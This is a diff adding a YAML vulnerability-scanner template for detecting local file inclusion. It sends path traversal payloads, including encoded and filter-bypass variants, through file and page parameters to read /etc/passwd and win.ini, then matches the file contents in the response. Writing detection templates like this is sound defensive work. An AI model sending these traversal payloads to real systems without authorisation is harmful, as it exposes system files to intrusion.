@@ -1,0 +1,44 @@
+id: lfi-detection
+
+info:
+  name: Local File Inclusion Detection
+  author: ExoShade
+  severity: high
+  tags: lfi,traversal,file-inclusion
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file={{payload}}"
+      - "{{BaseURL}}/index.php?file={{payload}}"
+      - "{{BaseURL}}/page.php?page={{payload}}"
+
+    payloads:
+      payload:
+        - "../../../../etc/passwd"
+        - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+        - "....//....//....//etc/passwd"
+        - "../../../../windows/win.ini"
+        - "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+
+    matchers-condition: or
+    matchers:
+      # Linux Matcher
+      - type: word
+        name: linux
+        part: body
+        words:
+          - "root:x:0:0"
+          - "daemon:x:"
+          - "bin:x:"
+        condition: or
+
+      # Windows Matcher
+      - type: word
+        name: windows
+        part: body
+        words:
+          - "for 16-bit app support"
+          - "[extensions]"
+          - "MPEGVideo"
+        condition: or
